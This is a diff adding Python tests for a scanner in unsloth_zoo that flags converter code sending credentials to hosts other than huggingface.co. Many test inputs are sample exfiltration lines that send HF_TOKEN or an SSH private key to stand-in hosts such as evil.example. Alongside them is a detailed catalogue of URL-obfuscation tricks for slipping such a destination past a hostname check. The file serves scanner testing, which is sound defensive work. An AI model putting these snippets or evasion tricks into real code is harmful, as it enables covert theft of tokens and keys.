+        'requests.get("https://huggingface.co",'
+        ' headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+
+def test_the_hub_narrowing_does_not_reach_any_other_rule():
+    """Only the env-harvest combination is narrowed."""
+    scan_converter_source = _load(
+        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    creds = (
+        'import requests\n'
+        'BASE_DOMAIN = "https://huggingface.co"\n'
+        'data = open("/root/.ssh/id_rsa").read()\n'
+        'requests.post(BASE_DOMAIN, data = data)\n'
+    )
+    assert any("credential paths" in f.check for f in scan_converter_source(creds)), (
+        [f.check for f in scan_converter_source(creds)]
+    )
+
+
+def test_the_hub_allowance_reads_the_real_hostname():
+    """Reads throughout, deliberately: the allowance refuses a write to the hub
+    outright, so a POST here would make every case pass without the hostname
+    check doing anything.
+    """
+    scan_converter_source = _load(
+        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    def _findings(url):
+        return [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                f'URL = "{url}"\n'
+                'requests.get(URL, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+            )
+        ]
+
+    assert _findings("https://huggingface.co:443@evil.example/collect"), (
+        "userinfo before the @ must not stand in for the hostname"
+    )
+    # A host that merely starts with the hub's name is a different host.
+    assert _findings("https://huggingface.co.evil.example/collect")
+    # A URL with no host at all names no destination, so nothing is suppressed.
+    assert _findings("https:///collect")
+    # And it still counts when it sits beside a real hub URL, which is the shape
+    # that matters: dropping hostless URLs instead of recording them let one be
+    # hidden behind a hub link in the same file.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co/api/models"\n'
+            'OUT = "https:///collect"\n'
+            'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+    # A scheme requests accepts is a scheme this has to read. requests
+    # normalizes HTTPS://, so a lowercase-only pattern let the destination be
+    # spelled past the check.
+    def _beside_the_hub(destination):
+        return [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'HUB = "https://huggingface.co/api/models"\n'
+                f'OUT = {destination}\n'
+                'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+            )
+        ]
+
+    assert _beside_the_hub('"HTTPS://evil.example/collect"')
+    assert _beside_the_hub('"HtTpS://evil.example/collect"')
+    assert _beside_the_hub('"https://evil.example/collect"')
+    assert _beside_the_hub('"https://huggingface.co/api/models"') == []
+
+    # The shapes that really are the hub still pass, port and case included.
+    assert _findings("https://huggingface.co/api/models") == []
+    assert _findings("https://huggingface.co:443/api/models") == []
+    assert _findings("https://HuggingFace.CO/api/models") == []
+
+    # bytes are URLs too: requests decodes b"https://..." and accepts it, so a
+    # destination in a bytes literal was invisible beside a str hub literal.
+    assert _beside_the_hub('b"https://evil.example/collect"')
+
+    # A backslash is part of the URL, not a place to stop reading it.
+    for separator in (chr(92), " ", chr(9), chr(10), "%20"):
+        assert _beside_the_hub(
+            '"https://huggingface.co' + separator + '@evil.example/collect"'
+        ), f"a {separator!r} in the authority must refuse the allowance"
+
+    # A destination spelled across `+` or `%` is still spelled out in full, and
+    # ast.parse does not fold either, so each operand named no host and a hub
+    # literal elsewhere in the file granted the allowance over a URL that reads
+    # as evil.example to every client.
+    assert _beside_the_hub('"https://" + "evil.example/collect"')
+    assert _beside_the_hub('"htt" + "ps://evil.example/collect"')
+    assert _beside_the_hub('"https://" + "evil.example" + "/collect"')
+    assert _beside_the_hub('b"https://" + b"evil.example/collect"')
+    assert _beside_the_hub('"%s://%s/collect" % ("https", "evil.example")')
+    assert _beside_the_hub('"https://%s/collect" % ("evil.example",)')
+
+    # The hub spelled the same way is still the hub.
+    assert _beside_the_hub('"https://huggingface.co" + "/api/models"') == []
+    assert _beside_the_hub('"https://hugging" + "face.co/api/models"') == []
+    assert _beside_the_hub('"%s/api/models" % ("https://huggingface.co",)') == []
+
+    # Only %s, %r and %% are folded:
+    assert _beside_the_hub('"%2000000000d" % 1') == []
+
+    # An f-string arrives here already split, and an empty interpolation is a
+    # no-op at runtime: f"https://{''}evil.example/log" fetches evil.example
+    # while leaving the scheme in one constant piece and the whole hostname, in
+    # plain sight, in another that no longer has a scheme in front of it.
+    assert _beside_the_hub("f\"https://{''}evil.example/collect\"")
+    assert _beside_the_hub('f"https://{SEP}evil.example/collect"')
+    assert _beside_the_hub('f"https://{org}.huggingface.co/api/models"')
+
+    # These two discriminate the f-string fold from every other check here: the
+    # constant piece in front IS the hub, so a walk that reads the pieces
+    # separately records huggingface.co and allows the file, while at runtime
+    # f"https://huggingface.co{SUFFIX}" with SUFFIX = "@evil.example/collect"
+    # fetches evil.example, everything before the @ being user information.
+    assert _beside_the_hub('f"https://huggingface.co{SUFFIX}"')
+    assert _beside_the_hub("f\"https://huggingface.co{'@evil.example/collect'}\"")
+    assert _beside_the_hub('f"https://huggingface.co{tld}/api/models"')
+
+    # A scheme with no authority at all means the destination is assembled
+    # somewhere this cannot follow, which every splitting trick was built on.
+    assert _beside_the_hub('"".join(("https://", "evil.example")) + "/collect"')
+    assert _beside_the_hub('"{}evil.example/collect".format("https://")')
+    assert _beside_the_hub('"https://"')
+
+    # A literal reaches the request as written only if nothing reshapes it, and
+    # BASE.replace("huggingface.co", "evil.example") fetches evil.example while
+    # every literal in the file is either the hub or a bare name with no scheme
+    # in front of it.
+    def _reshaped(body):
+        return [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'BASE = "https://huggingface.co"\n'
+                + body
+                + 'requests.get(url, params = {"leak": os.environ["HF_TOKEN"]})\n'
+            )
+        ]
+
+    assert _reshaped('url = BASE.replace("huggingface.co", "evil.example")\n')
+    assert _reshaped('url = "https://huggingface.co"[:8] + "evil.example"\n')
+    assert _reshaped('url = BASE[:8] + "evil.example"\n')
+    # Through an intermediate string, and through a walrus, which is the same
+    # receiver wearing a different hat.
+    assert _reshaped(
+        'u = f"{BASE}"\nurl = u.replace("huggingface.co", "evil.example")\n'
+    )
+    assert _reshaped(
+        'url = (u := BASE).replace("huggingface.co", "evil.example")\n'
+    )
+    # str.join was the last construction the folding did not model, and it beat
+    # both of the checks above:
+    assert _beside_the_hub('"".join(("htt", "ps://ev", "il.exa", "mple/collect"))')
+    # str.format splits a scheme the same way, and upstream spells plenty of
+    # strings with it, 15 literal receivers across the real modules, so this
+    # one is FOLDED rather than refused.
+    assert _beside_the_hub('"{}://{}".format("https", "evil.example/collect")')
+    assert _beside_the_hub('"{s}://{h}/c".format(s = "https", h = "evil.example")')
+    assert _beside_the_hub(
+        '"{a}://{b}".format_map({"a": "https", "b": "evil.example"})'
+    )
+    assert _beside_the_hub('"{}://{}".format("https", "huggingface.co")') == []
+    assert _beside_the_hub('"".join([x, "htt", "ps://evil.example/collect"])')
+    # The hole has to stay in the text.
+    assert _beside_the_hub('"".join(["https://huggingface.co", SUFFIX])')
+    assert _beside_the_hub('"/".join(["https:/", "evil.example", "collect"])')
+    # And the same seam in the other direction: a carrier put through a join
+    # came out the far side untainted, so reshaping the result was not a
+    # reshape of anything.
+    assert _reshaped('url = "".join([BASE, "/x"]).replace("huggingface.co", "evil.example")\n')
+    # += mutates the carrier in place and the walk still sees only the hub it
+    # started as, while at runtime the authority resolves to evil.example.
+    assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
+    # Appending to a carrier can rewrite the authority without touching the
+    # literal:
+    assert _reshaped('url = urljoin(BASE, "//evil.example/collect")\n')
+    assert _reshaped(
+        'import urllib.parse\nurl = urllib.parse.urljoin(BASE, "//evil.example/c")\n'
+    )
+    assert _reshaped(
+        'from urllib.parse import urlparse\n'
+        'assert urlparse(BASE).scheme == "https"\nurl = BASE\n'
+    ) == []
+    assert _reshaped('url = BASE + "@evil.example/collect"\n')
+    assert _reshaped('url = f"{BASE}@evil.example/collect"\n')
+    assert _reshaped('url = BASE + ".evil.example/collect"\n')
+    assert _reshaped('url = BASE + suffix\n')
+    assert _reshaped('url = BASE + "/api/models"\n') == []
+    assert _reshaped('url = BASE + "?full=true"\n') == []
+    assert _reshaped('url = f"{BASE}/api/{name}"\n') == []
+    # A carrier can be bound by unpacking or onto an attribute, and reading only
+    # bare Name targets lost it.
+    assert _reshaped(
+        'B, = ("https://huggingface.co",)\n'
+        'url = B.replace("huggingface.co", "evil.example")\n'
+    )
+    assert _reshaped(
+        '[B] = ["https://huggingface.co"]\nurl = B[:8] + "evil.example"\n'
+    )
+    assert _reshaped(
+        'class C: pass\n'
+        'C.B = "https://huggingface.co"\n'
+        'url = C.B.replace("huggingface.co", "evil.example")\n'
+    )
+    # A dictionary is a container like the others, and a lookup by name reads
+    # the value out rather than taking the string apart, so the carrier passes
+    # through it while a benign dictionary of hub URLs stays readable.
+    assert _reshaped(
+        'URLS = {"hub": "https://huggingface.co"}\n'
+        'url = URLS["hub"].replace("huggingface.co", "evil.example")\n'
+    )
+    assert _reshaped(
+        'URLS = {"hub": "https://huggingface.co"}\nurl = URLS["hub"]\n'
+    ) == []
+    # Unpacking hub URLs and using one as written is not a reshape.
+    assert _reshaped(
+        'A, url = ("https://huggingface.co/api", "https://huggingface.co")\n'
+    ) == []
+
+    # An element that folds to "" is a fold, not a hole:
+    assert _beside_the_hub('"".join(("https://huggingface.co", ""))') == []
+    assert _reshaped('url = f"{BASE}"[:8] + "evil.example"\n')
+    # Joining the hub with its own path is still the hub.
+    assert _beside_the_hub('"/".join(("https://huggingface.co", "api", "models"))') == []
+    assert _beside_the_hub('"".join(("https://", "huggingface.co", "/api"))') == []
+
+    # Settling which names carry a URL is bounded.
+    chain = "".join(
+        f'v{i} = f"{{v{i - 1}}}/x"\n' for i in range(1500)
+    ).replace("{v-1}", "{BASE}")
+    # The verdict carries this one: a fixpoint that does not settle inside its
+    # passes refuses, so an unbounded walk shows up as a different answer and
+    # not merely as a slow one.
+    assert _reshaped(chain + 'url = v1499.replace("huggingface.co", "evil.example")\n')
+
+    # The chain itself is what forces the passes, so the assignments are
+    # collected once rather than walked again per pass: 10000 of them, 203 KB,
+    # took about two seconds that way on a file the scan accepts at up to 8 MiB.
+    long_chain = 'v0 = BASE\n' + "".join(
+        f'v{i} = v{i - 1} + "/x"\n' for i in range(1, 10_000)
+    )
+    # Generous on purpose: this is the one check here with nothing but time to
+    # measure, and it exists to catch a return to walking the tree per pass,
+    # which took about a minute on this input rather than the two seconds it
+    # takes now.
+    started = time.perf_counter()
+    _reshaped(long_chain)
+    assert time.perf_counter() - started < 60
+
+    # What comes BACK from the hub is not a URL.
+    assert scan_converter_source(
+        'import os\n'
+        'import requests\n'
+        'BASE = "https://huggingface.co"\n'
+        'url = f"{BASE}/api/models"\n'
+        'r = requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        'r.raise_for_status()\n'
+        'head = r.content[:8]\n'
+    ) == []
+
+    # The hub through an f-string is still the hub, including upstream's own
+    # f"{BASE_DOMAIN}/{path}" and a BASE_DOMAIN with no trailing path.
+    assert _beside_the_hub('f"https://huggingface.co/api/models/{name}"') == []
+    assert _beside_the_hub('f"{HUB}/api/models"') == []
+    assert _beside_the_hub('"https://huggingface.co"') == []
